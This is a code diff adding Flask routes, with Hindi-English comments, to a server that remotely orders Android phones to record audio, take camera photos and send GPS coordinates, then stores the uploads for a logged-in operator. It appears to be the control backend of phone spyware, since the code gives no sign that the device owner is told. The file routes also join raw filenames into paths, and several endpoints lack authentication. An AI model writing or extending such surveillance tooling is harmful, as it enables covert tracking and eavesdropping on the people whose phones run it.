@@ -477,8 +477,308 @@ def get_device_location_files(device_id):
     location_files.sort(key=lambda x: x['modified'], reverse=True)
     return jsonify({'ok': True, 'locations': location_files[:5]})
 
-# Keep your existing routes for backward compatibility (they'll work with the default device)
-# ... [KEEP ALL YOUR EXISTING ROUTES AS THEY ARE] ...
+# ✅ LEGACY ROUTES FOR EXISTING ANDROID APP COMPATIBILITY
+
+# Legacy recording signal check (device-specific nahi)
+@app.route('/check-signal')
+def check_signal_legacy():
+    """Legacy support for existing Android apps"""
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    for device in all_devices:
+        if device['status'] == 'online':
+            device_id = device['id']
+            recording_signal = device_signals.get(device_id, {}).get('recording', False)
+            if recording_signal:
+                return jsonify({'record': True, 'record_time': 15})
+    
+    return jsonify({'record': False})
+
+# Legacy recording start (device-specific nahi)  
+@app.route('/start-recording', methods=['POST'])
+def start_recording_legacy():
+    """Legacy support for existing Android apps"""
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    if all_devices:
+        device_id = all_devices[0]['id']  # Pehla online device
+        if device_id not in device_signals:
+            device_signals[device_id] = {}
+        
+        device_signals[device_id]['recording'] = True
+        
+        record_time = 15
+        if request.is_json:
+            data = request.get_json()
+            record_time = data.get('record_time', 15)
+        
+        print(f"🎙️ Legacy recording signal sent to {device_id}")
+        return jsonify({'ok': True, 'message': f'Recording signal sent', 'record_time': record_time})
+    
+    return jsonify({'ok': False, 'error': 'No devices available'}), 400
+
+# Legacy camera signal check
+@app.route('/check-camera-signal')
+def check_camera_signal_legacy():
+    """Legacy support for existing Android apps"""
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    for device in all_devices:
+        if device['status'] == 'online':
+            device_id = device['id']
+            camera_signal = device_signals.get(device_id, {}).get('camera', {})
+            
+            if camera_signal and camera_signal.get('active'):
+                if time.time() - camera_signal.get('timestamp', 0) < 30:
+                    return jsonify({
+                        'capture': True,
+                        'camera_type': camera_signal.get('camera_type', 'front')
+                    })
+    
+    return jsonify({'capture': False})
+
+# Legacy camera signal start
+@app.route('/start-camera-signal', methods=['POST'])
+def start_camera_signal_legacy():
+    """Legacy support for existing Android apps"""
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    data = request.get_json()
+    camera_type = data.get('camera_type', 'front')
+    
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    if all_devices:
+        device_id = all_devices[0]['id']  # Pehla online device
+        
+        device_signals[device_id] = {
+            'camera': {
+                'active': True,
+                'camera_type': camera_type,
+                'timestamp': time.time()
+            }
+        }
+        
+        print(f"📸 Legacy camera signal sent to {device_id}")
+        return jsonify({'ok': True, 'message': f'Camera signal sent'})
+    
+    return jsonify({'ok': False, 'error': 'No devices available'}), 400
+
+# Legacy location signal check
+@app.route('/check-location-signal')
+def check_location_signal_legacy():
+    """Legacy support for existing Android apps"""
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    for device in all_devices:
+        if device['status'] == 'online':
+            device_id = device['id']
+            location_signal = device_signals.get(device_id, {}).get('location', {})
+            
+            if location_signal and location_signal.get('active'):
+                if time.time() - location_signal.get('timestamp', 0) < 30:
+                    return jsonify({'get_location': True})
+    
+    return jsonify({'get_location': False})
+
+# Legacy location signal start
+@app.route('/start-location-signal', methods=['POST'])
+def start_location_signal_legacy():
+    """Legacy support for existing Android apps"""
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    # Kisi bhi online device ko signal bhejo
+    all_devices = get_all_devices()
+    if all_devices:
+        device_id = all_devices[0]['id']  # Pehla online device
+        
+        if device_id not in device_signals:
+            device_signals[device_id] = {}
+        
+        device_signals[device_id]['location'] = {
+            'active': True,
+            'timestamp': time.time()
+        }
+        
+        print(f"📍 Legacy location signal sent to {device_id}")
+        return jsonify({'ok': True, 'message': f'Location signal sent'})
+    
+    return jsonify({'ok': False, 'error': 'No devices available'}), 400
+
+# Legacy signal received
+@app.route('/signal-received', methods=['POST'])
+def signal_received_legacy():
+    """Legacy support for existing Android apps"""
+    # Sabhi devices se signal clear karo
+    for device_id in list(device_signals.keys()):
+        if 'recording' in device_signals[device_id]:
+            device_signals[device_id]['recording'] = False
+    
+    return jsonify({'ok': True})
+
+# Legacy camera signal received
+@app.route('/camera-signal-received', methods=['POST'])
+def camera_signal_received_legacy():
+    """Legacy support for existing Android apps"""
+    # Sabhi devices se camera signal clear karo
+    for device_id in list(device_signals.keys()):
+        if 'camera' in device_signals[device_id]:
+            device_signals[device_id]['camera'] = {'active': False}
+    
+    return jsonify({'ok': True})
+
+# Legacy location signal received  
+@app.route('/location-signal-received', methods=['POST'])
+def location_signal_received_legacy():
+    """Legacy support for existing Android apps"""
+    # Sabhi devices se location signal clear karo
+    for device_id in list(device_signals.keys()):
+        if 'location' in device_signals[device_id]:
+            device_signals[device_id]['location'] = {'active': False}
+    
+    return jsonify({'ok': True})
+
+# Legacy file upload routes
+@app.route('/mobile-upload', methods=['POST'])
+def mobile_upload_legacy():
+    """Legacy support for existing Android apps"""
+    try:
+        print("📱 Legacy mobile upload received")
+        
+        audio_file = None
+        if 'file' in request.files:
+            audio_file = request.files['file']
+        elif 'audio' in request.files:
+            audio_file = request.files['audio']
+        
+        if not audio_file or audio_file.filename == '':
+            return jsonify({'ok': False, 'error': 'No file selected'}), 400
+        
+        timestamp = str(int(time.time()))
+        filename = f"legacy_android_recording_{timestamp}.m4a"
+        
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        audio_file.save(filepath)
+        
+        print(f"✅ Legacy recording uploaded: {filename}")
+        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
+    
+    except Exception as e:
+        print(f"❌ Legacy upload error: {e}")
+        return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+@app.route('/mobile-upload-photo', methods=['POST'])
+def mobile_upload_photo_legacy():
+    """Legacy support for existing Android apps"""
+    print("📸 Legacy photo upload received")
+    
+    if 'photo' not in request.files:
+        return jsonify({'ok': False, 'error': 'No photo file'}), 400
+    
+    photo_file = request.files['photo']
+    if photo_file.filename == '':
+        return jsonify({'ok': False, 'error': 'No file selected'}), 400
+    
+    if photo_file:
+        timestamp = str(int(time.time()))
+        filename = f"legacy_camera_photo_{timestamp}.jpg"
+        
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        photo_file.save(filepath)
+        
+        print(f"✅ Legacy photo uploaded: {filename}")
+        return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
+    
+    return jsonify({'ok': False, 'error': 'Upload failed'}), 500
+
+@app.route('/upload-location', methods=['POST'])
+def upload_location_legacy():
+    """Legacy support for existing Android apps"""
+    print("📍 Legacy location upload received")
+    
+    try:
+        data = request.get_json()
+        print("📍 Legacy location data:", data)
+        
+        if not data:
+            return jsonify({'ok': False, 'error': 'No location data'}), 400
+        
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        accuracy = data.get('accuracy')
+        
+        if latitude and longitude:
+            timestamp = str(int(time.time()))
+            filename = f"legacy_location_{timestamp}.txt"
+            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            
+            location_info = f"""Location Captured - Legacy Device
+Timestamp: {time.ctime()}
+Latitude: {latitude}
+Longitude: {longitude}
+Accuracy: {accuracy} meters
+
+Google Maps: https://maps.google.com/?q={latitude},{longitude}
+"""
+            
+            with open(filepath, 'w') as f:
+                f.write(location_info)
+            
+            print(f"✅ Legacy location saved: {filename}")
+            return jsonify({'ok': True, 'message': 'Location received', 'filename': filename})
+        else:
+            return jsonify({'ok': False, 'error': 'Invalid location data'}), 400
+            
+    except Exception as e:
+        print(f"❌ Legacy location upload error: {e}")
+        return jsonify({'ok': False, 'error': f'Location save failed: {e}'}), 500
+
+# File download route
+@app.route('/files/<filename>')
+def download_file(filename):
+    """File download route"""
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    
+    try:
+        return send_file(
+            os.path.join(app.config['UPLOAD_FOLDER'], filename),
+            as_attachment=True,
+            download_name=filename
+        )
+    except FileNotFoundError:
+        return "File not found", 404
+
+# File delete route
+@app.route('/delete-file/<filename>', methods=['POST'])
+def delete_file(filename):
+    """File delete route"""
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    try:
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        if os.path.exists(filepath):
+            os.remove(filepath)
+            return jsonify({'ok': True, 'message': 'File deleted'})
+        else:
+            return jsonify({'ok': False, 'error': 'File not found'}), 404
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)}), 500
+
+# Debug route to check devices
+@app.route('/debug-devices')
+def debug_devices():
+    devices = get_all_devices()
+    return jsonify({
+        'total_devices': len(devices),
+        'devices': devices
+    })
 
 # DEVICES_HTML template - Shows list of all connected devices
 DEVICES_HTML = """
